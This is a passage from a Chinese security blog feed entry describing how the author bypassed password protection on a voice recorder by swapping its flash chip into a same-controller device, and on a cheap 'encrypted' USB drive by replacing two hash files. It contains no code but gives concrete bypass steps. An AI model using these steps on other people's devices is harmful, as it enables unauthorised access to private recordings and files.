src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/15.png" alt="img"></p><p>​ 读出的固件文件如下：</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/16.jpg" alt="img">    然而对固件解包却遇到了问题，因为编程器读写 Nand flash 芯片时，是按页顺序读写的，读取出的数据与实际数据存储的地址是不一致的，因此如果需要恢复原来的数据，需要根据芯片型号对应去恢复成原来的数据结构，其中涉及到数据恢复技术，成本较高。</p><h4 id="更换主控"><a href="#更换主控" class="headerlink" title="更换主控"></a><strong>更换主控</strong></h4><p>​数据恢复一般用在 flash 芯片受损时使用，如果存储芯片时完好的，只是主控芯片有问题，换成同样读写算法的主控，大多数情况下是可以识别成功的，但作为录音笔采用炬力芯片，市场上的主流U盘主控并不支持该类型算法，试验银灿和安国的U盘主控都无法识别。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/17.jpg" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/18.jpg" alt="img"></p><p>​因为密码和配置都存储在 flash 中，采用同一型号的录音笔，一个加密，另一个不加密，调换 flash 芯片，同样会提示需要密码，而且密码是不变的。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/19.jpg" alt="img"></p><p>​既然同款主控因为内部逻辑代码是一致的，选购了一款同品牌的不同款录音笔，拆解发现主控芯片是一致的，硬件架构基本相同，随即把原来加密的存储芯片换至新的录音笔中。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/20.jpg" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/21.jpg" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/22.jpg" alt="img"></p><h4 id="破解成功"><a href="#破解成功" class="headerlink" title="破解成功"></a><strong>破解成功</strong></h4><p>​更换完成后，重新开机，发现屏幕正常点亮，插入电脑，成功识别，存储的文件为上个加密录音笔的文件，说明破解成功。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/23.jpg" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/24.jpg" alt="img"></p><h3 id="某款手机U盘破解"><a href="#某款手机U盘破解" class="headerlink" title="某款手机U盘破解"></a><strong>某款手机U盘破解</strong></h3><p>​    随着人们对数据安全意识的提高，借这股东风，越来越多的厂商推出了带有加密功能的U盘，然后国情如此，部分黑心厂商给一些低质量的U盘加上了所谓的 “多重加密” 功能，就堂而皇之的以高价售卖。其硬件组成不过是一张 micro SD 卡加上读卡座和 usb 插头。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/25.jpg" alt="img"></p><p>​其硬件组成不过是一张 micro SD 卡加上读卡座和 usb 插头。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/26.jpg" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/27.jpg" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/28.jpg" alt="img"></p><p>​而其所谓的多重加密，不过是最简单的软件层加密，都不要去逆向app 的算法，直接替换 u盘 根目录下面的 .hash1.txt .hash2.txt 即可破解，毫无保密可言，黑心程度可见一斑，对加密 U 盘有需求的用户，还是推荐买大品牌的，毕竟便宜无好货，自古以来的真理。</p><p><strong>总结</strong></p><p>​对于软件层面的加密，破解往往是非常简单低成本的，直接替换掉芯片或者替换加密key即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;&lt;strong&gt;前言&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;​    随着电子信息产业的高速发展，电子产品对于各类数据处理的技术愈加强大，为人们的工作与社交带来了许多
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="移动硬盘破解" scheme="http://yaseng.org/tags/%E7%A7%BB%E5%8A%A8%E7%A1%AC%E7%9B%98%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="u 盘破解" scheme="http://yaseng.org/tags/u-%E7%9B%98%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="录音笔破解" scheme="http://yaseng.org/tags/%E5%BD%95%E9%9F%B3%E7%AC%94%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
</feed>
